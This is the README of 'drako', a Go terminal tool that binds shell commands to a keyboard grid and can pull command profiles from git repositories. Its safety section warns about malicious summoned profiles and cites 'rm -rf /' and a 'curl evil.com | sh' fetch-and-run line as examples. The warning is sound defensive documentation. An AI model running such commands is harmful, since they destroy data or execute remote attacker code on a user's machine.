https://github.com/user-attachments/assets/21fb2340-bc74-4886-a629-8e95d116e830

**drako** represents an entirely new species of terminal tools: the customizable **Command-Deck Launcher**. It is not a menu, nor a shell history. It is a brutalist **architectural framework for any CLI-based workflow**, solidifying your scattered commands, TUIs, and scripts into a cohesive control surface. As such, CLI-driven workflows become remarkably easy to document, distribute, teach, and scale across a team.

## ✨ TLDR; 

`drako` is built on a few core principles:

-   **Harness, Don't Replace:** It integrates with the tools you already use. If it runs in the terminal, it can be bound to the grid.
-   **The Grid:** Your keyboard-based command center. It is technically `3-dimensional` and can fit up to 729 (9x * 9y * 9z) commands per `grid`, any of which can be accessed almost instantly using **Quick Navigation** (see below). Cycle through command grids or stash them in the `inventory` folder using `i`.
-   **Profiles, Decks, & Assets:** A `profile` consists of a `grid configuration` (size etc), a collection of commands (the `deck`), and `assets` (optional). Example: A `profile` can have a `deck` of Docker commands, and have Docker compose files as its `assets`. 
-   **Portable Specs:** All `profile` files exist in `~/.config/drako/`. You can download new `profile` setups from any `git` repository to your `inventory` folder using `drako summon`. You can even have multiple such `profiles` in a single repo (`specs`). Git-manage your own `spec` folder and `summon` your own control panel in an instant.

### 🧭 Navigation

- **Grid Navigation:** Use arrows, `w/a/s/d`, or `h/j/k/l` (customizable in config.toml).
- **Quick Nativagion:** For example : Pressing `2` and `3` in quick sequence moves the cursor to the 2nd column, 3rd row.
- **Switch Profile:** `Alt` + `1-9` to switch directly.
- **Cycle Profile:** `o` (prev) and `p` (next).
- **Profile Inventory:** `i`.
- **Lock Current Profile (for launching):** `r`.
- **Grid/Path Toggle:** `Tab`.
- **Path Mode:**
    - **Search:** `e` (type to filter, arrows to select, esc to cancel).
    - **Hidden Files:** `.` to toggle.
    - **Back:** `q` or `Esc`.
- **Quit:** `Ctrl+C` (Global), or `q` (Grid Mode).

> **Customization:** Remap keys in `~/.config/drako/config.toml` under `[keys]`.

## 🚀 Quick Start

> Requires Go **1.24** or newer.

If Go is installed, installing `drako` is a single command.

```bash
go install github.com/lucky7xz/drako@latest
```

### Install Go

- Debian/Ubuntu: `sudo apt install golang`
- Arch: `sudo pacman -S go`
- macOS: `brew install go`
- Windows: `scoop install go` or `winget install GoLang.Go`

### Update

To update `drako` to the latest version, simply run the installation command again.

If you are not getting the latest version, use this command instead:
```bash
GOPROXY=direct go install github.com/lucky7xz/drako/cmd/drako@latest  # update drako
```
[!NOTE] New to Go? Unlike apt or brew, Go installs tools into your home folder (~/go/bin) rather than the system root. You must add this directory to your shell's PATH to run `drako` directly. You can lauch drako with `~/go/bin/drako`. In the `Settings` Cell (`core profile`), you can find a command called `Add go/bin to PATH` that will write the necessary changes to your shell config file.

> [!NOTE]
> **Emoji Support:** drako profiles sometimes use emojis as visual indicators. Modern terminals (Ghostty, WezTerm etc.) may support them by default. Others (older Linux terminals) may require installing a "Nerd Font" (e.g., [Nerd Fonts](https://www.nerdfonts.com/)) or specific emoji font packages (e.g., `fonts-noto-color-emoji`).

### Shell Integration

To enable `cd` on exit, see [docs/SHELL_INTEGRATION.md](docs/SHELL_INTEGRATION.md). 


## 👢 Bootstrap & 🧶 The Weaver

**The Bootstrap:** On first run, `drako` creates:
- `config.toml`: Global settings (Input Keys, Global Theme).
- `core.profile.toml`: The default command profile (Process Monitor, System Info, etc.)

**NOTE:** Bootstrapping only occurs if files (config.toml and core.profile.toml) are missing. To clean-up, use `drako purge --interactive` or `drako purge --destroyeverything` (backup your work first).

**The Weaver:** Ensures cross-platform consistency. Inside the Drako binary lies a **Settings Template**, a **Core Template**, and a **[dictionary](internal/config/bootstrap/core_dictionary.toml)** of OS-specific defaults. When you run Drako for the first time, The Weaver "weaves" these together to create `~/.config/drako/core.profile.toml` tailored to your OS.

**Clean Slate:** The default inventory is intentionally minimal to avoid cluttering your workspace. You can summon curated command decks directly from the **Install Tools** menu in the Core profile, or use the CLI to summon them manually:

- **101 Series** ([Source](https://github.com/lucky7xz/101-deck)): `drako summon https://github.com/lucky7xz/101-deck.git`
- **GGML** ([Source](https://github.com/lucky7xz/ggml-deck)): `drako summon https://github.com/lucky7xz/ggml-deck.git`

```markdown
internal/config/bootstrap/      
├── settings_template.toml     # [Template] Global settings
├── core_template.toml         # [Template] Default profile commands
├── core_dictionary.toml       # [Dictionary] OS-specific command mappings
└── inventory/                 # [Profiles] Minimal default inventory (ssh-utils)
```

**NOTE:** If your OS specific dictionary is missing, feel free to create a pull request!


## 📇 Profile Creation Example

Create a new file with the `.profile.toml` extension. `drako` will discover it automatically.

 For example `~/.config/drako/networking.profile.toml`:

```toml
# Define grid size and theme for this profile.
x = 3
y = 4
theme = "dracula"

[[commands]]
name = "nmap LAN"
command = "nmap -sn 192.168.1.0/24"
col = a
row = 0
auto_close_execution = false       # Here we want to keep the window open after execution to actaully see the output.

[[commands]]
name = "Bandwidth"
command = "bmon"
col = a
row = 1
# auto-close true per default      # Here we want to close the window after execution because bmon is a TUI.

```

## 🧰 Power Tools

Beyond the TUI, Drako provides CLI commands for advanced management.

### 🪄 Summoning Profiles

Share and reuse command decks across machines and teams. Instead of manually copying profiles, summon them directly from remote sources:

```bash

# Clones the repo and looks for .profile.toml files.
# Discards the temporary repo

drako summon git@github.com:user/my_profile_collection.git
```

**NOTE:** Works with any Git host (GitHub, GitLab, self-hosted). Summoned profiles land in `inventory/`, validated before copying.

If a profile needs extra files (scripts, configs), declare it under `assets = ["relative/path/to/file", ...]`.
`drako` will copy these assets to `~/.config/drako/assets/<profile_name>/`.

You can then reference them in your commands using their full path. This can be useful when managing multiple ansible playbooks using drako, for example.

### 📚 Profile Specs 


Apply a "spec" to bulk-manage your profiles.

```bash
# Load a spec (e.g. ~/.config/drako/specs/example.spec.toml)
# Profiles listed are EQUIPPED (visible), others are STORED (inventory/).
# Useful for context switching (e.g. "Work Mode" vs "Gaming Mode").
drako spec example

# Stash profiles listed in the spec (move to inventory/).
# Useful for clearing a specific set of profiles without affecting others.
drako stash example

# Move all profiles to inventory/ (except Core)
drako strip

```

## 🗑️ Purge

Safely reset or remove configurations.
```bash
# Remove Core profile (moves to trash/)
drako purge --target core

# Remove a specific profile (moves to trash/)
drako purge --target git

# Use interactive mode to purge profiles
drako purge --interactive

# Remove config.toml specifically (to trash/)
drako purge --config

# NUCLEAR OPTION: Delete everything in the .config/drako/ folder (NO TRASH, NO UNDO) 💀
drako purge --destroyeverything
```

## 🚑 Rescue Mode

If your configuration breaks (syntax error, invalid grid), Drako won't crash. It enters **Rescue Mode**.

- **Repair Tools:** Provides buttons to edit `config.toml`, open the config directory, or remove broken profiles.
- **Manual Access:** You can enter `[ Rescue Mode ]` manually via the **Inventory** (`i`).
- **Exit:** Select "Exit Rescue Mode" or switch to a working profile (`o`/`p`) to return to normal operation.

## ⚠️ Safety First

- **Summoning is a Trust Operation:** When you summon a profile, you are downloading code that `drako` will execute. A malicious profile could contain harmful commands (e.g., `rm -rf /`, `curl evil.com | sh`).
    - **Review before running:** Always inspect the contents of a summoned profile (using `cat` or your editor) *before* you start using it.
    - **Only summon from trusted sources:** Treat a profile URL like you would a binary executable.
- **Understand the Commands:** Some entries perform system changes (e.g., package updates, Docker operations). Press `e` in the TUI to read the command description.
- **When Unsure:** Consult documentation or ask a trusted friend/colleague.

## Roadmap 

 - [x] Update Bootstrap collection
 - [x] Summon profiles incl assets
 - [x] DRY Refactor  
 - [x] Grid Size Safety & Rescue Mode
 - [x] Core Profile Concept
 - [~] MacOS support (untested)
 - [~] Windows support (untested)
 - [~] Full unit test suite
 - [ ] Steamdeck support
 - [~] ARM Support
 - [ ] CI/CD
 - [ ] Auto Update

---

## 🤝 Contribution

Ideas are welcome. Bugs will be hunted.
-   **Issues:** Report defects or propose architectural changes.
-   **Pull Requests:** Fork the repository and submit your work.
-   **Alpha State:** `drako` is currently in (late) ALPHA. It is stable but evolving. This is your opportunity to influence its development.

---

## ❤️ Thanks to Charmbracelet

`drako` uses several Charmbracelet projects to deliver the TUI:

- [`bubbletea`](https://github.com/charmbracelet/bubbletea) for the model/view/update loop
- [`lipgloss`](https://github.com/charmbracelet/lipgloss) for layout and styling
- [`bubbles`](https://github.com/charmbracelet/bubbles) for common components



## 📜 License

The core Drako engine is released under the [GNU Affero General Public License v3.0](LICENSE). Bootstrap assets in the `bootstrap/` directory are released under either [MIT](bootstrap/LICENSE-MIT) or [Apache-2.0](bootstrap/LICENSE-Apache) licenses.

---
<div align="center">

Tame the chaos.

</div>
